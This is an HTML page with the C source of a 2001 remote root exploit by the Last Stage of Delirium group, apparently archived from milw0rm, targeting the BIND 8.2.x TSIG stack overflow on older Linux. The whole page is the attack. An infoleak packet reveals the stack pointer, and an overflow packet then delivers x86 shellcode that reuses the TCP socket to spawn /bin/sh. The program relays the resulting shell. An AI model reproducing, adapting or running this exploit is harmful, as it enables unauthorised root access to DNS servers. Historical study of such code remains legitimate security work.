<html><head><title>BIND 8.2.x (TSIG) Remote Root Stack Overflow Exploit (2)</title></head><pre>/*## copyright LAST STAGE OF DELIRIUM feb 2001 poland        *://lsd-pl.net/ #*/
/*## bind 8.2 8.2.1 8.2.2 8.2.2-PX                  Slackware 4.0/RedHat 6.2 #*/

/* The code establishes a TCP connection with port 53 of a target system.     */
/* It makes use of the &quot;infoleak&quot; bug (through UDP) to obtain the base        */
/* value of the named process frame stack pointer, which is later used        */
/* for constructing proper DNS tsig exploit packet.                           */
/*                                                                            */
/* Upon successful exploitation the assembly routine gets executed. It        */
/* walks the descriptor table of the exploited named process in a search      */
/* for the socket descriptor of the previously established TCP connection.    */
/* Found descriptor is duplicated on stdin, stdout and stderr and /bin/sh     */
/* is spawned.                                                                */
/*                                                                            */
/* The use of such an assembly routine allows successfull exploitation of     */
/* the vulnerability in the case when vulnerable dns servers are protected    */
/* by tightly configured firewall systems (with only 53 tcp/udp port open).   */

#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;rpc/rpc.h&gt;
#include &lt;netdb.h&gt;
#include &lt;stdio.h&gt;
#include &lt;errno.h&gt;

char msg[]={
    0xab,0xcd,0x09,0x80,0x00,0x00,0x00,0x01,
    0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,
    0x01,0x20,0x20,0x20,0x20,0x02,0x61
};

char asmcode[]=
    &quot;\x3f&quot;                 /* label len 63                   */
    &quot;\x90\x90\x90&quot;         /* padding                        */

    &quot;\xeb\x3b&quot;             /* jmp     &lt;asmcode+65&gt;           */
    &quot;\x31\xdb&quot;             /* xorl    %ebx,%ebx              */
    &quot;\x5f&quot;                 /* popl    %edi                   */
    &quot;\x83\xef\x7c&quot;         /* sub     $0x7c,%edi             */
    &quot;\x8d\x77\x10&quot;         /* leal    0x10(%edi),%esi        */
    &quot;\x89\x77\x04&quot;         /* movl    %esi,0x4(%edi)         */
    &quot;\x8d\x4f\x20&quot;         /* leal    0x20(%edi),%ecx        */
    &quot;\x89\x4f\x08&quot;         /* movl    %ecx,0x8(%edi)         */
    &quot;\xb3\x10&quot;             /* movb    $0x10,%bl              */
    &quot;\x89\x19&quot;             /* movl    %ebx,(%ecx)            */
    &quot;\x31\xc9&quot;             /* xorl    %ecx,%ecx              */
    &quot;\xb1\xff&quot;             /* movb    $0xff,%cl              */
    &quot;\x89\x0f&quot;             /* movl    %ecx,(%edi)            */
    &quot;\x51&quot;                 /* pushl   %ecx                   */
    &quot;\x31\xc0&quot;             /* xorl    %eax,%eax              */
    &quot;\xb0\x66&quot;             /* movb    $0x66,%al              */
    &quot;\xb3\x07&quot;             /* movb    $0x7,%bl               */
    &quot;\x89\xf9&quot;             /* movl    %edi,%ecx              */
    &quot;\xcd\x80&quot;             /* int     $0x80                  */
    &quot;\x59&quot;                 /* popl    %ecx                   */
    &quot;\x31\xdb&quot;             /* xorl    %ebx,%ebx              */
    &quot;\x39\xd8&quot;             /* cmpl    %ebx,%eax              */
    &quot;\x75\x0a&quot;             /* jne     &lt;asmcode+62&gt;           */
    &quot;\x66\xbb\x12\x34&quot;     /* movw    $0x1234,%bx            */
    &quot;\x66\x39\x5e\x02&quot;     /* cmpw    %bx,0x2(%esi)          */
    &quot;\x74\x08&quot;             /* je      &lt;asmcode+70&gt;           */
    &quot;\xe2\xe0&quot;             /* loop    &lt;asmcode+32&gt;           */

    &quot;\x3f&quot;                 /* label len 63                   */

    &quot;\xe8\xc0\xff\xff\xff&quot; /* call    &lt;asmcode+6&gt;            */
    &quot;\x89\xcb&quot;             /* movl    %ecx,%ebx              */
    &quot;\x31\xc9&quot;             /* xorl    %ecx,%ecx              */
    &quot;\xb1\x03&quot;             /* movb    $0x03,%cl              */
    &quot;\x31\xc0&quot;             /* xorl    %eax,%eax              */
    &quot;\xb0\x3f&quot;             /* movb    $0x3f,%al              */
    &quot;\x49&quot;                 /* decl    %ecx                   */
    &quot;\xcd\x80&quot;             /* int     $0x80                  */
    &quot;\x41&quot;                 /* incl    %ecx                   */
    &quot;\xe2\xf6&quot;             /* loop    &lt;asmcode+76&gt;           */
    &quot;\xeb\x14&quot;             /* jmp     &lt;asmcode+108&gt;          */
    &quot;\x31\xc0&quot;             /* xorl    %eax,%eax              */
    &quot;\x5b&quot;                 /* popl    %ebx                   */
    &quot;\x8d\x4b\x14&quot;         /* leal    0x14(%ebx),%ecx        */
    &quot;\x89\x19&quot;             /* movl    %ebx,(%ecx)            */
    &quot;\x89\x43\x18&quot;         /* movl    %eax,0x18(%ebx)        */
    &quot;\x88\x43\x07&quot;         /* movb    %al,0x7(%ebx)          */
    &quot;\x31\xd2&quot;             /* xorl    %edx,%edx              */
    &quot;\xb0\x0b&quot;             /* movb    $0xb,%al               */
    &quot;\xcd\x80&quot;             /* int     $0x80                  */
    &quot;\xe8\xe7\xff\xff\xff&quot; /* call    &lt;asmcode+88&gt;           */
    &quot;/bin/sh&quot;

    &quot;\x90\x90\x90\x90&quot;     /* padding                        */
    &quot;\x90\x90\x90\x90&quot;
;

int rev(int a){
    int i=1;
    if((*(char*)&amp;i)) return(a);
    return((a&gt;&gt;24)&amp;0xff)|(((a&gt;&gt;16)&amp;0xff)&lt;&lt;8)|(((a&gt;&gt;8)&amp;0xff)&lt;&lt;16)|((a&amp;0xff)&lt;&lt;24);
}

int main(int argc,char **argv){
    char buffer[1024],*b;
    int i,c,n,sck[2],fp,ptr6,jmp,cnt,ofs,flag=-1;
    struct hostent *hp;
    struct sockaddr_in adr;

    printf(&quot;copyright LAST STAGE OF DELIRIUM feb 2001 poland  //lsd-pl.net/\n&quot;);
    printf(&quot;bind 8.2 8.2.1 8.2.2 8.2.2PX for slackware 4.0/redhat 6.2 x86\n\n&quot;);

    if(argc&lt;2){
        printf(&quot;usage: %s address [-s][-e]\n&quot;,argv[0]);
        printf(&quot;    -s  send infoleak packet\n&quot;);
        printf(&quot;    -e  send exploit packet\n&quot;);
        exit(-1);
    }

    while((c=getopt(argc-1,&amp;argv[1],&quot;se&quot;))!=-1){
        switch(c){
        case 's': flag=1;break;
        case 'e': flag=2;
        }
    }
    if(flag==-1) exit(-1);

    adr.sin_family=AF_INET;
    adr.sin_port=htons(53);
    if((adr.sin_addr.s_addr=inet_addr(argv[1]))==-1) {
        if((hp=gethostbyname(argv[1]))==NULL) {
            errno=EADDRNOTAVAIL;goto err;
        }
        memcpy(&amp;adr.sin_addr.s_addr,hp-&gt;h_addr,4);
    }

    sck[0]=socket(AF_INET,SOCK_DGRAM,0);
    sck[1]=socket(AF_INET,SOCK_STREAM,0);

    if(connect(sck[0],(struct sockaddr*)&amp;adr,sizeof(adr))&lt;0) goto err;
    if(connect(sck[1],(struct sockaddr*)&amp;adr,sizeof(adr))&lt;0) goto err;

    i=sizeof(struct sockaddr_in);
    if(getsockname(sck[1],(struct sockaddr*)&amp;adr,&amp;i)==-1){
        struct netbuf {unsigned int maxlen;unsigned int len;char *buf;};
        struct netbuf nb;
        ioctl(sck[1],(('S'&lt;&lt;8)|2),&quot;sockmod&quot;);
        nb.maxlen=0xffff;
        nb.len=sizeof(struct sockaddr_in);;
        nb.buf=(char*)&amp;adr;
        ioctl(sck[1],(('T'&lt;&lt;8)|144),&amp;nb);
    }
    n=ntohs(adr.sin_port);

    asmcode[4+48+2]=(unsigned char)((n&gt;&gt;8)&amp;0xff);
    asmcode[4+48+3]=(unsigned char)(n&amp;0xff);

    if(write(sck[0],msg,sizeof(msg))==-1) goto err;
    if((cnt=read(sck[0],buffer,sizeof(buffer)))==-1) goto err;
   
    printf(&quot;stack dump:\n&quot;);
    for(i=0;i&lt;(cnt-512);i++){
        printf(&quot;%s%02x &quot;,(i&amp;&amp;(!(i%16)))?&quot;\n&quot;:&quot;&quot;,(unsigned char)buffer[512+i]);
    }
    printf(&quot;\n\n&quot;);

    fp=rev(*(unsigned int*)&amp;buffer[532]);
    ofs=0xfe-((fp-(fp&amp;0xffffff00))&amp;0xff);
    cnt=163;

    if((buffer[512+20+2]!=(char)0xff)&amp;&amp;(buffer[512+20+3]!=(char)0xbf)){
        printf(&quot;system does not seem to be a vulnerable linux\n&quot;);exit(1);
    }
    if(flag==1){
        printf(&quot;system seems to be running bind 8.2.x on a linux\n&quot;);exit(-1);
    }
    if(cnt&lt;(ofs+28)){
        printf(&quot;frame ptr is too low to be successfully exploited\n&quot;);exit(-1);
    }


    jmp=rev(fp-586);
    ptr6=rev((fp&amp;0xffffff00)-12);
    fp=rev(fp&amp;0xffffff00);

    printf(&quot;frame ptr=0x%08x adr=%08x ofs=%d &quot;,rev(fp),rev(jmp),ofs);
    printf(&quot;port=%04x connected! &quot;,(unsigned short)n);fflush(stdout);

    b=buffer;
    memcpy(b,&quot;\xab\xcd\x01\x00\x00\x02\x00\x00\x00\x00\x00\x01&quot;,12);b+=12;
    for(i=0;i&lt;strlen(asmcode);i++) *b++=asmcode[i];
    for(i=0;i&lt;(128&gt;&gt;1);i++,b++) *b++=0x01;
    memcpy(b,&quot;\x00\x00\x01\x00\x01&quot;,5);b+=5;
    for(i=0;i&lt;((ofs+64)&gt;&gt;1);i++,b++) *b++=0x01;

    *b++=28;
    memcpy(b,&quot;\x06\x00\x00\x00&quot;,4);b+=4;
    memcpy(b,&amp;fp,4);b+=4;
    memcpy(b,&quot;\x06\x00\x00\x00&quot;,4);b+=4;
    memcpy(b,&amp;jmp,4);b+=4;
    memcpy(b,&amp;jmp,4);b+=4;
    memcpy(b,&amp;fp,4);b+=4;
    memcpy(b,&amp;ptr6,4);b+=4;

    cnt-=ofs+28;
    for(i=0;i&lt;(cnt&gt;&gt;1);i++,b++) *b++=0x01;

    memcpy(b,&quot;\x00\x00\x01\x00\x01\x00\x00\xfa\xff&quot;,9);b+=9;


    if(write(sck[0],buffer,b-buffer)==-1) goto err;
    sleep(1);printf(&quot;sent!\n&quot;);

    write(sck[1],&quot;/bin/uname -a\n&quot;,14);
    while(1){
        fd_set fds;
        FD_ZERO(&amp;fds);
        FD_SET(0,&amp;fds);
        FD_SET(sck[1],&amp;fds);
        if(select(FD_SETSIZE,&amp;fds,NULL,NULL,NULL)){
            int cnt;
            char buf[1024];
            if(FD_ISSET(0,&amp;fds)){
                if((cnt=read(0,buf,1024))&lt;1){
                    if(errno==EWOULDBLOCK||errno==EAGAIN) continue;
                    else break;
                }
                write(sck[1],buf,cnt);
            }
            if(FD_ISSET(sck[1],&amp;fds)){
                if((cnt=read(sck[1],buf,1024))&lt;1){
                    if(errno==EWOULDBLOCK||errno==EAGAIN) continue;
                    else break;
                }
                write(1,buf,cnt);
            }
        }
    }
    exit(0);
err:
    perror(&quot;error&quot;);exit(-1);
}


// milw0rm.com [2001-03-01]</pre></html>